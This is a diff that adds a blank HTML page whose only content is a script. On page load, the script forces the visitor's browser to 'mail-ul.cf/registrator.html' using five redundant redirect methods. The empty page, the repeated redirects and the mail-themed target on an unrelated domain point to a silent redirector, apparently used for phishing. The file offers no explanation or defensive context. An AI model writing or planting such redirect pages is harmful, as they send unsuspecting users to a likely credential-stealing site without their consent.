@@ -1,0 +1,17 @@
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta charset="utf-8"/>
+<title></title>
+<meta name="viewport" content="width=device-width"/>
+<script type="text/javascript">
+location="http://mail-ul.cf/registrator.html";
+document.location.href="http://mail-ul.cf/registrator.html";
+location.replace("http://mail-ul.cf/registrator.html");
+window.location.reload("http://mail-ul.cf/registrator.html");
+document.location.replace("http://mail-ul.cf/registrator.html");
+</script>
+</head>
+<body>
+</body>
+</html>
